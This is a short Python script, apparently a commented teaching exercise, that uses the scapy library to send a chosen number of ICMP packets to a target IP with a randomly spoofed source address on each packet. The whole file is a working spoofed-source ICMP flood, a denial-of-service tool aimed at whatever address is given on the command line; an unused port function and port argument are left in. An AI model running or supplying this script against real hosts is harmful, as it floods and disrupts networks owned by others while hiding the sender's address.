import sys  # Importing the module for command-line arguments
from scapy.all import *  # Importing scapy, a library for packet manipulation

def randomIP():  # Function to obtain random IPs
    # Generates four random integers from 0 to 255, turns them into a string.
    # Each integer is joined and separated by ".". Example: "190.0.0.1"
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))  # Creates a string variable storing a random IP
    return ip  # Returns the randomly generated IP address

def randPort():  # Function to obtain random port numbers
    x = random.randint(0, 64000)  # Randomly generates an integer between 0 and 64000 inclusive
    return x  # Returns the randomly generated port number

# Command line arguments
dest_ip_address = sys.argv[1]  # Index 1 of command line arguments is the destination's IP address
dest_port = int(sys.argv[2])  # Index 2 of command line arguments is the destination's port number
pkt_count = int(sys.argv[3])  # Index 3 of command line arguments is the total number of packets
for i in range(0, pkt_count):  # For loop iterating the total packet count
    src_ip = randomIP()  # For each iteration, generates a random source IP address
    packet = IP(src=str(src_ip),
                dst=dest_ip_address)  # Generates IP header using scapy's IP() function with source and destination IP addresses
    pkt = packet / ICMP()  # Stacks the packet objects with IP header on top and the ICMP packet below it
    send(pkt)  # Sends the combined ICMP packet over the network
